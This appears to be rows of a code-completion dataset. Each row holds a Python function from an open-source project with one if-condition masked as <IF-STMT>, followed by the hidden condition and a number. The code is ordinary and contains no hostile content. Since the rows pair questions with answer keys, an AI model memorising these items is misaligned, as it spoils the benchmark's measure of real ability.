1231,"def cvPreprocess():<tab>import cv2<tab>imgarr_orig = []<tab>image_ext_list = ["".jpg"", "".png"", "".JPEG"", "".jpeg"", "".PNG"", "".JPG""]<tab>for file in onlyfiles:<tab><tab>fimg = imgroot + file<tab><tab>if any([x in image_ext_list for x in fimg]):<tab><tab><tab>print(fimg + "" is not an image file"")<tab><tab><tab>continue<tab><tab>img1 = cv2.imread(fimg)<tab><tab><IF-STMT><tab><tab><tab>print(""ERROR opening "", fimg)<tab><tab><tab>continue<tab><tab>img1 = cv2.resize(img1, (896, 896))<tab><tab>imgarr_orig.append(img1)<tab>return imgarr_orig",if img1 is None :,187
1232,"def substituteargs(self, pattern, replacement, old):<tab>new = []<tab>for k in range(len(replacement)):<tab><tab>item = replacement[k]<tab><tab>newitem = [item[0], item[1], item[2]]<tab><tab>for i in range(3):<tab><tab><tab>if item[i] == ""*"":<tab><tab><tab><tab>newitem[i] = old[k][i]<tab><tab><tab><IF-STMT><tab><tab><tab><tab>index = int(item[i][1:]) - 1<tab><tab><tab><tab>newitem[i] = old[index][i]<tab><tab>new.append(tuple(newitem))<tab>##self.report(""old: %r"", old)<tab>##self.report(""new: %r"", new)<tab>return new","elif item [ i ] [ : 1 ] == ""$"" :",187
1233,"def process(self, profile):<tab>contributors = self.createContributors(profile)<tab>for contributor in contributors:<tab><tab><IF-STMT><tab><tab><tab>reasons = self.createExecSqlNodeReason(contributor, profile)<tab><tab>else:<tab><tab><tab>reasons = self.createExecNodeReason(contributor, profile)<tab><tab>contributor.reason = reasons<tab>return contributors","if contributor . type == ""SQLOperator"" :",106
1234,"def showImage(filename):<tab>osName = platform.system()<tab>if osName == ""Windows"":<tab><tab>subprocess.Popen([filename], shell=True)<tab>elif osName == ""Linux"":<tab><tab># TODO: should I leave it to user's config ?<tab><tab>LINUX_DISPLAY_COMMAND = (""xdg-open"", ""display"", ""gvfs-open"", ""shotwell"")<tab><tab>commands = list(filter(HasCommand, LINUX_DISPLAY_COMMAND))<tab><tab><IF-STMT>  # command found<tab><tab><tab>subprocess.Popen([commands[0], filename])<tab><tab>else:<tab><tab><tab>raise<tab>elif osName == ""Darwin"":  # by @Naville<tab><tab>subprocess.Popen([""open"", filename])<tab>else:<tab><tab>raise Exception(""other system"")",if commands :,187
1235,"def add_libdirs(self, envvar, sep, fatal=False):<tab>v = os.environ.get(envvar)<tab>if not v:<tab><tab>return<tab>for dir in str.split(v, sep):<tab><tab>dir = str.strip(dir)<tab><tab>if not dir:<tab><tab><tab>continue<tab><tab>dir = os.path.normpath(dir)<tab><tab><IF-STMT><tab><tab><tab>if not dir in self.library_dirs:<tab><tab><tab><tab>self.library_dirs.append(dir)<tab><tab>elif fatal:<tab><tab><tab>fail(""FATAL: bad directory %s in environment variable %s"" % (dir, envvar))",if os . path . isdir ( dir ) :,159
1236,"def add(self, state):<tab>if state.key in self:<tab><tab><IF-STMT><tab><tab><tab>raise sa_exc.InvalidRequestError(<tab><tab><tab><tab>""Can't attach instance ""<tab><tab><tab><tab>""%s; another instance with key %s is already ""<tab><tab><tab><tab>""present in this session."" % (orm_util.state_str(state), state.key)<tab><tab><tab>)<tab><tab>return False<tab>else:<tab><tab>self._dict[state.key] = state.obj()<tab><tab>self._manage_incoming_state(state)<tab><tab>return True",if attributes . instance_state ( self . _dict [ state . key ] ) is not state :,154
1237,"def request(self, stream=None, tty=None, demux=None):<tab>assert stream is not None and tty is not None and demux is not None<tab>with APIClient(base_url=self.address, version=DEFAULT_DOCKER_API_VERSION) as client:<tab><tab><IF-STMT><tab><tab><tab>url = client._url(""/tty"")<tab><tab>else:<tab><tab><tab>url = client._url(""/no-tty"")<tab><tab>resp = client._post(url, stream=True)<tab><tab>return client._read_from_socket(resp, stream=stream, tty=tty, demux=demux)",if tty :,147
1238,"def select(model, path, iter_, paths_):<tab>(paths, first) = paths_<tab>value = model.get_value(iter_)<tab>if value is None:<tab><tab>return not bool(paths)<tab>value = normalize_path(value)<tab>if value in paths:<tab><tab>self.get_child().get_selection().select_path(path)<tab><tab>paths.remove(value)<tab><tab><IF-STMT><tab><tab><tab>self.get_child().set_cursor(path)<tab><tab><tab># copy treepath, gets invalid after the callback<tab><tab><tab>first.append(path.copy())<tab>else:<tab><tab>for fpath in paths:<tab><tab><tab>if fpath.startswith(value):<tab><tab><tab><tab>self.get_child().expand_row(path, False)<tab>return not bool(paths)",if not first :,194
1239,"def _validate(self, qobj):<tab>for experiment in qobj.experiments:<tab><tab><IF-STMT><tab><tab><tab>logger.warning(<tab><tab><tab><tab>""no measurements in circuit '%s', ""<tab><tab><tab><tab>""classical register will remain all zeros."",<tab><tab><tab><tab>experiment.header.name,<tab><tab><tab>)","if ""measure"" not in [ op . name for op in experiment . instructions ] :",93
1240,"def exitval_from_opts(options, project):<tab>exit_value_from = options.get(""--exit-code-from"")<tab>if exit_value_from:<tab><tab>if not options.get(""--abort-on-container-exit""):<tab><tab><tab>log.warning(""using --exit-code-from implies --abort-on-container-exit"")<tab><tab><tab>options[""--abort-on-container-exit""] = True<tab><tab><IF-STMT><tab><tab><tab>log.error(<tab><tab><tab><tab>'No service named ""%s"" was found in your compose file.', exit_value_from<tab><tab><tab>)<tab><tab><tab>sys.exit(2)<tab>return exit_value_from",if exit_value_from not in [ s . name for s in project . get_services ( ) ] :,178
1241,"def __call__(self, tokens, reader):<tab>first_return = False<tab>for token in tokens:<tab><tab><IF-STMT><tab><tab><tab>reader.context.current_function.exit_count = 1<tab><tab><tab>first_return = True<tab><tab>if token == ""return"":<tab><tab><tab>if first_return:<tab><tab><tab><tab>first_return = False<tab><tab><tab>else:<tab><tab><tab><tab>reader.context.current_function.exit_count += 1<tab><tab>yield token","if not hasattr ( reader . context . current_function , ""exit_count"" ) :",128
1242,"def _register_builtin_handlers(self, events):<tab>for spec in handlers.BUILTIN_HANDLERS:<tab><tab>if len(spec) == 2:<tab><tab><tab>event_name, handler = spec<tab><tab><tab>self.register(event_name, handler)<tab><tab>else:<tab><tab><tab>event_name, handler, register_type = spec<tab><tab><tab>if register_type is handlers.REGISTER_FIRST:<tab><tab><tab><tab>self._events.register_first(event_name, handler)<tab><tab><tab><IF-STMT><tab><tab><tab><tab>self._events.register_last(event_name, handler)",elif register_type is handlers . REGISTER_LAST :,148
1243,"def test_sql(self):<tab>with self.get_temp() as temp:<tab><tab>railroad = to_railroad(simpleSQL)<tab><tab>assert len(railroad) == 7<tab><tab>temp.write(railroad_to_html(railroad))<tab><tab><IF-STMT><tab><tab><tab>print(""sql: "" + temp.name)",if self . railroad_debug ( ) :,93
1244,"def resources_to_link(self, resources):<tab>if isinstance(self.Bucket, dict) and ""Ref"" in self.Bucket:<tab><tab>bucket_id = self.Bucket[""Ref""]<tab><tab>if not isinstance(bucket_id, string_types):<tab><tab><tab>raise InvalidEventException(<tab><tab><tab><tab>self.relative_id, ""'Ref' value in S3 events is not a valid string.""<tab><tab><tab>)<tab><tab><IF-STMT><tab><tab><tab>return {""bucket"": resources[bucket_id], ""bucket_id"": bucket_id}<tab>raise InvalidEventException(<tab><tab>self.relative_id, ""S3 events must reference an S3 bucket in the same template.""<tab>)",if bucket_id in resources :,166
1245,"def list_target_unit_files(self, *modules):  # -> [ (unit,enabled) ]<tab>""""""show all the target units and the enabled status""""""<tab>result = {}<tab>enabled = {}<tab>for unit in _all_common_targets:<tab><tab>result[unit] = None<tab><tab>enabled[unit] = ""static""<tab><tab>if unit in _all_common_enabled:<tab><tab><tab>enabled[unit] = ""enabled""<tab><tab><IF-STMT><tab><tab><tab>enabled[unit] = ""enabled""<tab>return [(unit, enabled[unit]) for unit in sorted(result)]",if unit in _all_common_disabled :,147
1246,"def teardown_network_port(self):<tab>""""""tearDown for Network and Port table""""""<tab>networks = self.quantum.get_all_networks(""t1"")<tab>for net in networks:<tab><tab>netid = net[""net-id""]<tab><tab>name = net[""net-name""]<tab><tab><IF-STMT><tab><tab><tab>ports = self.quantum.get_all_ports(netid)<tab><tab><tab>for por in ports:<tab><tab><tab><tab>self.quantum.delete_port(netid, por[""port-id""])<tab><tab><tab>self.quantum.delete_network(netid)","if ""net"" in name :",148
1247,"def findConfigFiles(self, cfg_args):<tab>""""""Find available config files""""""<tab>filenames = cfg_args.config[:]<tab>proj_opts = (""unittest.cfg"", ""nose2.cfg"")<tab>for fn in proj_opts:<tab><tab><IF-STMT><tab><tab><tab>fn = os.path.abspath(os.path.join(cfg_args.top_level_directory, fn))<tab><tab>filenames.append(fn)<tab>if cfg_args.user_config:<tab><tab>user_opts = (""~/.unittest.cfg"", ""~/.nose2.cfg"")<tab><tab>for fn in user_opts:<tab><tab><tab>filenames.append(os.path.expanduser(fn))<tab>return filenames",if cfg_args . top_level_directory :,171
1248,"def make_aware(value):<tab>if settings.USE_TZ:<tab><tab># naive datetimes are assumed to be in UTC.<tab><tab><IF-STMT><tab><tab><tab>value = timezone.make_aware(value, timezone.utc)<tab><tab># then convert to the Django configured timezone.<tab><tab>default_tz = timezone.get_default_timezone()<tab><tab>value = timezone.localtime(value, default_tz)<tab>return value",if timezone . is_naive ( value ) :,106
1249,"def update(id):<tab>""""""Update a post if the current user is the author.""""""<tab>post = get_post(id)<tab>if request.method == ""POST"":<tab><tab>title = request.form[""title""]<tab><tab>body = request.form[""body""]<tab><tab>error = None<tab><tab>if not title:<tab><tab><tab>error = ""Title is required.""<tab><tab><IF-STMT><tab><tab><tab>flash(error)<tab><tab>else:<tab><tab><tab>post.title = title<tab><tab><tab>post.body = body<tab><tab><tab>db.session.commit()<tab><tab><tab>return redirect(url_for(""blog.index""))<tab>return render_template(""blog/update.html"", post=post)",if error is not None :,168
1250,"def copyfileobj(src, dest, length=512):<tab>if hasattr(src, ""readinto""):<tab><tab>buf = bytearray(length)<tab><tab>while True:<tab><tab><tab>sz = src.readinto(buf)<tab><tab><tab>if not sz:<tab><tab><tab><tab>break<tab><tab><tab>if sz == length:<tab><tab><tab><tab>dest.write(buf)<tab><tab><tab>else:<tab><tab><tab><tab>b = memoryview(buf)[:sz]<tab><tab><tab><tab>dest.write(b)<tab>else:<tab><tab>while True:<tab><tab><tab>buf = src.read(length)<tab><tab><tab><IF-STMT><tab><tab><tab><tab>break<tab><tab><tab>dest.write(buf)",if not buf :,162
1251,"def imgFileProcessingTick(output):<tab>if isinstance(output, tuple):<tab><tab>workerOutput.append(output)<tab><tab>workerPool.terminate()<tab>else:<tab><tab>for page in output:<tab><tab><tab>if page is not None:<tab><tab><tab><tab>options.imgMetadata[page[0]] = page[1]<tab><tab><tab><tab>options.imgOld.append(page[2])<tab>if GUI:<tab><tab>GUI.progressBarTick.emit(""tick"")<tab><tab><IF-STMT><tab><tab><tab>workerPool.terminate()",if not GUI . conversionAlive :,129
1252,"def process_word(word):<tab>if word.parent == ""remapping"":<tab><tab>raise UDError(""There is a cycle in a sentence"")<tab>if word.parent is None:<tab><tab>head = int(word.columns[HEAD])<tab><tab>if head > len(ud.words) - sentence_start:<tab><tab><tab>raise UDError(<tab><tab><tab><tab>""HEAD '{}' points outside of the sentence"".format(word.columns[HEAD])<tab><tab><tab>)<tab><tab><IF-STMT><tab><tab><tab>parent = ud.words[sentence_start + head - 1]<tab><tab><tab>word.parent = ""remapping""<tab><tab><tab>process_word(parent)<tab><tab><tab>word.parent = parent",if head :,163
1253,"def validate_export(namespace):<tab>destination = namespace.destination<tab>if destination == ""file"":<tab><tab><IF-STMT><tab><tab><tab>raise CLIError(""usage error: --path PATH --format FORMAT"")<tab>elif destination == ""appconfig"":<tab><tab>if (namespace.dest_name is None) and (namespace.dest_connection_string is None):<tab><tab><tab>raise CLIError(""usage error: --config-name NAME | --connection-string STR"")<tab>elif destination == ""appservice"":<tab><tab>if namespace.appservice_account is None:<tab><tab><tab>raise CLIError(""usage error: --appservice-account NAME_OR_ID"")",if namespace . path is None or namespace . format_ is None :,159
1254,"def get_change_set_status(context, stack_name, change_set_name):<tab>try:<tab><tab>response = retry_boto_call(<tab><tab><tab>context.client.describe_change_set,<tab><tab><tab>ChangeSetName=change_set_name,<tab><tab><tab>StackName=stack_name,<tab><tab>)<tab>except ClientError as e:<tab><tab><IF-STMT><tab><tab><tab>return None<tab><tab>else:<tab><tab><tab>raise e<tab>return response[""Status""]","if e . response [ ""Error"" ] [ ""Code"" ] == ""ChangeSetNotFound"" :",127
1255,"def predict(self, predict_data):<tab>assert self.predict_fn is not None<tab># For the batch by batch prediction case, we do not want to include the cost of<tab># doing final outputs concatenation into time measurement<tab>with Timer() as t:<tab><tab><IF-STMT><tab><tab><tab>self.predictions = self.predict_fn(predict_data)<tab><tab>else:<tab><tab><tab>self.predictions = self.predict_fn(predict_data, concatenate_outputs=False)<tab>if not self.batch_benchmark:<tab><tab>self.predictions = np.concatenate(self.predictions)<tab>return t.interval",if self . batch_benchmark :,148
1256,"def __str__(self):<tab>s = ""("" + str(self[0])<tab>s += "", ""<tab>if isinstance(self[1], Tensor):<tab><tab>if self[1].name and self[1].name is not None:<tab><tab><tab>s += self[1].name<tab><tab>else:<tab><tab><tab>s += ""tensor-"" + hex(id(self[1]))<tab>else:<tab><tab>s += str(self[1])<tab>s += "", ""<tab>if isinstance(self[2], Tensor):<tab><tab><IF-STMT><tab><tab><tab>s += self[2].name<tab><tab>else:<tab><tab><tab>s += ""tensor-"" + hex(id(self[2]))<tab>else:<tab><tab>s += str(self[2])<tab>s += "")""<tab>return s",if self [ 2 ] . name and self [ 2 ] . name is not None :,198
1257,"def get_local_cache(self, past, data, from_file, temp_id):<tab>""""""parse individual cached geometry if there is any""""""<tab>cache = []<tab>if self.accumulative:<tab><tab><IF-STMT><tab><tab><tab>cache = past[temp_id]<tab><tab>if not from_file and len(data) > 0:<tab><tab><tab>cache = data.get(temp_id, [])<tab>return cache",if from_file and len ( past ) > 0 :,109
1258,def get_mappings(index):<tab>mappings = {}<tab>from kitsune.search.models import get_mapping_types<tab>for cls in get_mapping_types():<tab><tab>group = cls.get_index_group()<tab><tab><IF-STMT><tab><tab><tab>mappings[cls.get_mapping_type_name()] = cls.get_mapping()<tab>return mappings,if index == write_index ( group ) or index == read_index ( group ) :,101
1259,"def find_first_of_filetype(content, filterfiltype, attr=""name""):<tab>""""""Find the first of the file type.""""""<tab>filename = """"<tab>for _filename in content:<tab><tab><IF-STMT><tab><tab><tab>if _filename.endswith(f"".{filterfiltype}""):<tab><tab><tab><tab>filename = _filename<tab><tab><tab><tab>break<tab><tab>else:<tab><tab><tab>if getattr(_filename, attr).endswith(f"".{filterfiltype}""):<tab><tab><tab><tab>filename = getattr(_filename, attr)<tab><tab><tab><tab>break<tab>return filename","if isinstance ( _filename , str ) :",135
1260,"def _timer(<tab>duetime: typing.AbsoluteOrRelativeTime,<tab>period: Optional[typing.RelativeTime] = None,<tab>scheduler: Optional[typing.Scheduler] = None,) -> Observable:<tab>if isinstance(duetime, datetime):<tab><tab><IF-STMT><tab><tab><tab>return observable_timer_date(duetime, scheduler)<tab><tab>else:<tab><tab><tab>return observable_timer_duetime_and_period(duetime, period, scheduler)<tab>if period is None:<tab><tab>return observable_timer_timespan(duetime, scheduler)<tab>return observable_timer_timespan_and_period(duetime, period, scheduler)",if period is None :,160
1261,"def __getattribute__(self, attrname):<tab>result = object.__getattribute__(self, attrname)<tab><IF-STMT><tab><tab>try:<tab><tab><tab>self._read_info(attrname)<tab><tab>except Exception as e:<tab><tab><tab>logging.warning(<tab><tab><tab><tab>""An error '%s' was raised while decoding '%s'"", e, repr(self.path)<tab><tab><tab>)<tab><tab>result = object.__getattribute__(self, attrname)<tab><tab>if result is NOT_SET:<tab><tab><tab>result = self.INITIAL_INFO[attrname]<tab>return result",if result is NOT_SET :,138
1262,"def on_btOK_clicked(self, *a):<tab>""""""Handler for OK button""""""<tab>if self.ac_callback is not None:<tab><tab>self._set_title()<tab><tab><IF-STMT><tab><tab><tab>self.ac_callback(self.id, self)<tab><tab>else:<tab><tab><tab>a = self.generate_modifiers(<tab><tab><tab><tab>self._action, self._selected_component.NAME == ""custom""<tab><tab><tab>)<tab><tab><tab>self.ac_callback(self.id, a)<tab><tab><tab>self.ac_callback = None<tab><tab>if self._selected_component:<tab><tab><tab>self._selected_component.on_ok(a)<tab>self.close()",if self . _mode == ActionEditor . AEC_MENUITEM :,180
1263,"def execute():<tab>if frappe.db.get_value(""Company"", {""country"": ""India""}, ""name""):<tab><tab>address_template = frappe.db.get_value(""Address Template"", ""India"", ""template"")<tab><tab><IF-STMT><tab><tab><tab>set_up_address_templates(default_country=""India"")","if not address_template or ""gstin"" not in address_template :",94
1264,"def is_ncname(name):<tab>first = name[0]<tab>if first == ""_"" or category(first) in NAME_START_CATEGORIES:<tab><tab>for i in xrange(1, len(name)):<tab><tab><tab>c = name[i]<tab><tab><tab>if not category(c) in NAME_CATEGORIES:<tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab><tab>continue<tab><tab><tab><tab>return 0<tab><tab><tab># if in compatibility area<tab><tab><tab># if decomposition(c)!='':<tab><tab><tab>#<tab>return 0<tab><tab>return 1<tab>else:<tab><tab>return 0",if c in ALLOWED_NAME_CHARS :,151
1265,"def _get_sonnet_version():<tab>with open(""sonnet/__init__.py"") as fp:<tab><tab>for line in fp:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>g = {}<tab><tab><tab><tab>exec(line, g)  # pylint: disable=exec-used<tab><tab><tab><tab>return g[""__version__""]<tab><tab>raise ValueError(""`__version__` not defined in `sonnet/__init__.py`"")","if line . startswith ( ""__version__"" ) :",102
1266,def disjoined(self):<tab>gridscope = GridScope(globals=self.globals)<tab>for key in self.user_added:<tab><tab>value = self[key]<tab><tab><IF-STMT><tab><tab><tab>grid = vaex.utils.disjoined(value)<tab><tab><tab>gridscope[key] = grid<tab><tab>else:<tab><tab><tab>gridscope[key] = value<tab>return gridscope,"if isinstance ( value , np . ndarray ) :",101
1267,def _maybe_uncompress(self):<tab>if not self._decompressed:<tab><tab>compression_type = self.compression_type<tab><tab><IF-STMT><tab><tab><tab>data = memoryview(self._buffer)[self._pos :]<tab><tab><tab>if compression_type == self.CODEC_GZIP:<tab><tab><tab><tab>uncompressed = gzip_decode(data)<tab><tab><tab>if compression_type == self.CODEC_SNAPPY:<tab><tab><tab><tab>uncompressed = snappy_decode(data.tobytes())<tab><tab><tab>if compression_type == self.CODEC_LZ4:<tab><tab><tab><tab>uncompressed = lz4_decode(data.tobytes())<tab><tab><tab>self._buffer = bytearray(uncompressed)<tab><tab><tab>self._pos = 0<tab>self._decompressed = True,if compression_type != self . CODEC_NONE :,192
1268,"def read_chat_forever(reader, pub_socket):<tab>line = reader.readline()<tab>who = ""someone""<tab>while line:<tab><tab>print(""Chat:"", line.strip())<tab><tab><IF-STMT><tab><tab><tab>who = line.split("":"")[-1].strip()<tab><tab>try:<tab><tab><tab>pub_socket.send_pyobj((who, line))<tab><tab>except socket.error as e:<tab><tab><tab># ignore broken pipes, they just mean the participant<tab><tab><tab># closed its connection already<tab><tab><tab>if e[0] != 32:<tab><tab><tab><tab>raise<tab><tab>line = reader.readline()<tab>print(""Participant left chat."")","if line . startswith ( ""name:"" ) :",162
1269,"def items(self, section=None):<tab>section = section if section is not None else Settings.DEFAULT_SECTION<tab>result = {""section"": section}<tab>try:<tab><tab><IF-STMT><tab><tab><tab>for option in self._global_settings.options(section):<tab><tab><tab><tab>result[option] = self._global_settings.get(section, option)<tab><tab>if section in self._local_settings.sections():<tab><tab><tab>for option in self._local_settings.options(section):<tab><tab><tab><tab>result[option] = self._local_settings.get(section, option)<tab>except configparser.InterpolationSyntaxError:<tab><tab>core.termwarn(""Unable to parse settings file"")<tab>return result",if section in self . _global_settings . sections ( ) :,172
1270,"def before_train(self, program):<tab>""""""doc""""""<tab>if self.summary_record:<tab><tab>if self.summary_record.scalar:<tab><tab><tab>self.s_name, self.s_tolog = zip(*self.summary_record.scalar)<tab><tab>else:<tab><tab><tab>self.s_name, self.s_tolog = [], []<tab><tab><IF-STMT><tab><tab><tab>self.h_name, self.h_tolog = zip(*self.summary_record.histogram)<tab><tab>else:<tab><tab><tab>self.h_name, self.h_tolog = [], []",if self . summary_record . histogram :,150
1271,"def _s3_init(self):<tab>""""""Initialize s3 bucket.""""""<tab>try:<tab><tab>bucket_exists = yield self._bucket_exists()<tab><tab><IF-STMT><tab><tab><tab>LOGGER.warning(""Will attempt to create bucket"")<tab><tab><tab>yield self._create_bucket()<tab>except botocore.exceptions.NoCredentialsError:<tab><tab>LOGGER.error(<tab><tab><tab>'You must set ""s3.accessKeyId"" and ""s3.secretAccessKey"", or '<tab><tab><tab>'""s3.profile"" in your Streamlit configuration.'<tab><tab>)<tab><tab>raise errors.S3NoCredentials",if not bucket_exists :,144
1272,"def id2unit(self, id):<tab>items = []<tab>for v, k in zip(id, self._id2unit.keys()):<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab>if self.keyed:<tab><tab><tab>items.append(""{}={}"".format(k, self._id2unit[k][v]))<tab><tab>else:<tab><tab><tab>items.append(self._id2unit[k][v])<tab>res = self.sep.join(items)<tab>if res == """":<tab><tab>res = ""_""<tab>return res",if v == EMPTY_ID :,130
1273,"def forward(model: TransformerListener, docs, is_train):<tab>if is_train:<tab><tab>model.verify_inputs(docs)<tab><tab>return model._outputs, model.backprop_and_clear<tab>else:<tab><tab><IF-STMT><tab><tab><tab>outputs = []<tab><tab>elif any(doc._.trf_data is None for doc in docs):<tab><tab><tab>width = model.get_dim(""nO"")<tab><tab><tab>outputs = [<tab><tab><tab><tab>TransformerData.zeros(len(doc), width, xp=model.ops.xp) for doc in docs<tab><tab><tab>]<tab><tab>else:<tab><tab><tab>outputs = [doc._.trf_data for doc in docs]<tab><tab>return outputs, lambda d_data: []",if len ( docs ) == 0 :,182
1274,"def get_plugin_dir(shooting_dir):<tab>DIRNAME = ""lunapark""<tab>parent = os.path.abspath(os.path.join(shooting_dir, os.pardir))<tab>if os.path.basename(parent) == DIRNAME:<tab><tab>return parent<tab>else:<tab><tab>plugin_dir = os.path.join(parent, DIRNAME)<tab><tab><IF-STMT><tab><tab><tab>os.makedirs(plugin_dir)<tab><tab>return plugin_dir",if not os . path . exists ( plugin_dir ) :,129
1275,"def _get_plugin(self, name, lang=None, check=False):<tab>if lang is None:<tab><tab>lang = self.get_lang()<tab>if name not in self.plugin_attrib_map:<tab><tab>return None<tab>plugin_class = self.plugin_attrib_map[name]<tab>if plugin_class.is_extension:<tab><tab><IF-STMT><tab><tab><tab>return self.plugins[(name, None)]<tab><tab>else:<tab><tab><tab>return None if check else self.init_plugin(name, lang)<tab>else:<tab><tab>if (name, lang) in self.plugins:<tab><tab><tab>return self.plugins[(name, lang)]<tab><tab>else:<tab><tab><tab>return None if check else self.init_plugin(name, lang)","if ( name , None ) in self . plugins :",189
1276,"def globs_relative_to_buildroot(self):<tab>buildroot = get_buildroot()<tab>globs = []<tab>for bundle in self.bundles:<tab><tab>fileset = bundle.fileset<tab><tab>if fileset is None:<tab><tab><tab>continue<tab><tab><IF-STMT><tab><tab><tab>globs += bundle.fileset.filespec[""globs""]<tab><tab>else:<tab><tab><tab># NB(nh): filemap is an OrderedDict, so this ordering is stable.<tab><tab><tab>globs += [fast_relpath(f, buildroot) for f in bundle.filemap.keys()]<tab>super_globs = super().globs_relative_to_buildroot()<tab>if super_globs:<tab><tab>globs += super_globs[""globs""]<tab>return {""globs"": globs}","elif hasattr ( fileset , ""filespec"" ) :",187
1277,"def running_jobs(self, exit_on_error=True):<tab>""""""Initialize multiprocessing.""""""<tab>with self.handling_exceptions():<tab><tab><IF-STMT><tab><tab><tab>from concurrent.futures import ProcessPoolExecutor<tab><tab><tab>try:<tab><tab><tab><tab>with ProcessPoolExecutor(self.jobs) as self.executor:<tab><tab><tab><tab><tab>yield<tab><tab><tab>finally:<tab><tab><tab><tab>self.executor = None<tab><tab>else:<tab><tab><tab>yield<tab>if exit_on_error:<tab><tab>self.exit_on_error()",if self . using_jobs :,131
1278,"def _get_all_checkpoint_paths(self) -> List[str]:<tab>""""""Returns all the checkpoint paths managed by the instance.""""""<tab># Due to tensorflow/issues/19378, we cannot use `tf.io.gfile.glob` here<tab># because it returns directory contents recursively on Windows.<tab>if tf.io.gfile.exists(self._root_dir):<tab><tab>root_dir_entries = tf.io.gfile.listdir(self._root_dir)<tab><tab>return [<tab><tab><tab>os.path.join(self._root_dir, e)<tab><tab><tab>for e in root_dir_entries<tab><tab><tab><IF-STMT><tab><tab>]<tab>else:<tab><tab>return []",if e . startswith ( self . _prefix ),170
1279,"def test_tag_priority(self):<tab>for tag in _low_priority_D_TAG:<tab><tab>val = ENUM_D_TAG[tag]<tab><tab># if the low priority tag is present in the descriptions,<tab><tab># assert that it has not overridden any other tag<tab><tab>if _DESCR_D_TAG[val] == tag:<tab><tab><tab>for tag2 in ENUM_D_TAG:<tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab><tab>continue<tab><tab><tab><tab>self.assertNotEqual(ENUM_D_TAG[tag2], val)",if tag2 == tag :,135
1280,"def cycle(self, forward=True):<tab>if self.cycle_list:<tab><tab>if forward is True:<tab><tab><tab>self.cycle_list.rotate(-1)<tab><tab><IF-STMT><tab><tab><tab>self.cycle_list.rotate(1)<tab><tab>self.move_to_obj(self.cycle_list[0])",elif forward is False :,82
1281,"def __init__(self):<tab>self.keyring = None<tab>if not haveKeyring:<tab><tab>return<tab>try:<tab><tab>self.keyring = gnomekeyring.get_default_keyring_sync()<tab><tab><IF-STMT><tab><tab><tab># Code borrowed from<tab><tab><tab># http://trac.gajim.org/browser/src/common/passwords.py<tab><tab><tab>self.keyring = ""default""<tab><tab><tab>try:<tab><tab><tab><tab>gnomekeyring.create_sync(self.keyring, None)<tab><tab><tab>except gnomekeyring.AlreadyExistsError:<tab><tab><tab><tab>pass<tab>except:<tab><tab>logging.exception(""Error determining keyring"")<tab><tab>self.keyring = None",if self . keyring == None :,171
1282,"def _coerce_trials_data(data, path):<tab>if not isinstance(data, list):<tab><tab><IF-STMT><tab><tab><tab>raise BatchFileError(<tab><tab><tab><tab>path,<tab><tab><tab><tab>""invalid data type for trials: expected list or dict""<tab><tab><tab><tab>"", got %s"" % type(data).__name__,<tab><tab><tab>)<tab><tab>data = [data]<tab>for item in data:<tab><tab>if not isinstance(item, dict):<tab><tab><tab>raise BatchFileError(<tab><tab><tab><tab>path, ""invalid data type for trial %r: expected dict"" % item<tab><tab><tab>)<tab>return data","if not isinstance ( data , dict ) :",152
1283,def update(self):<tab>if self.openfilename is not None:<tab><tab>try:<tab><tab><tab>current_mtime = os.stat(self.openfilename).st_mtime<tab><tab>except OSError:<tab><tab><tab>return True<tab><tab><IF-STMT><tab><tab><tab>self.last_mtime = current_mtime<tab><tab><tab>self.reload()<tab>return True,if current_mtime != self . last_mtime :,91
1284,"def _wrap_new_compiler(*args, **kwargs):<tab>try:<tab><tab>return func(*args, **kwargs)<tab>except errors.DistutilsPlatformError:<tab><tab><IF-STMT><tab><tab><tab>CCompiler = _UnixCCompiler<tab><tab>else:<tab><tab><tab>CCompiler = _MSVCCompiler<tab><tab>return CCompiler(None, kwargs[""dry_run""], kwargs[""force""])","if not sys . platform == ""win32"" :",98
1285,"def _run_eagerly(*inputs):  # pylint: disable=missing-docstring<tab>with context.eager_mode():<tab><tab>constants = [<tab><tab><tab>_wrap_as_constant(value, tensor_spec)<tab><tab><tab>for value, tensor_spec in zip(inputs, input_signature)<tab><tab>]<tab><tab>output = fn(*constants)<tab><tab>if hasattr(output, ""_make""):<tab><tab><tab>return output._make([tensor.numpy() for tensor in output])<tab><tab><IF-STMT><tab><tab><tab>return [tensor.numpy() for tensor in output]<tab><tab>else:<tab><tab><tab>return output.numpy()","if isinstance ( output , ( tuple , list ) ) :",153
1286,"def _on_event_MetadataAnalysisFinished(self, event, data):<tab>with self._selectedFileMutex:<tab><tab><IF-STMT><tab><tab><tab>self._setJobData(<tab><tab><tab><tab>self._selectedFile[""filename""],<tab><tab><tab><tab>self._selectedFile[""filesize""],<tab><tab><tab><tab>self._selectedFile[""sd""],<tab><tab><tab><tab>self._selectedFile[""user""],<tab><tab><tab>)",if self . _selectedFile :,99
1287,"def env_asset_url_default(endpoint, values):<tab>""""""Create asset URLs dependent on the current env""""""<tab>if endpoint == ""views.themes"":<tab><tab>path = values.get(""path"", """")<tab><tab>static_asset = path.endswith("".js"") or path.endswith("".css"")<tab><tab>direct_access = "".dev"" in path or "".min"" in path<tab><tab><IF-STMT><tab><tab><tab>env = values.get(""env"", current_app.env)<tab><tab><tab>mode = "".dev"" if env == ""development"" else "".min""<tab><tab><tab>base, ext = os.path.splitext(path)<tab><tab><tab>values[""path""] = base + mode + ext",if static_asset and not direct_access :,166
1288,"def __init__(self, inStr):<tab>""""""Initialize the class.""""""<tab>inStr = inStr.strip()<tab>if len(inStr) != 1 and len(inStr) != 2:<tab><tab>raise ValueError(""PosAlign: length not 2 chars"" + inStr)<tab>if inStr == "".."":<tab><tab>self.aa = ""-""<tab><tab>self.gap = 1<tab>else:<tab><tab>self.gap = 0<tab><tab>self.aa = inStr[0]<tab><tab><IF-STMT><tab><tab><tab>self.aa = ""C""<tab><tab>if len(inStr) == 2:<tab><tab><tab>self.ss = inStr[1].upper()<tab><tab>else:<tab><tab><tab>self.ss = ""0""",if self . aa == self . aa . lower ( ) :,179
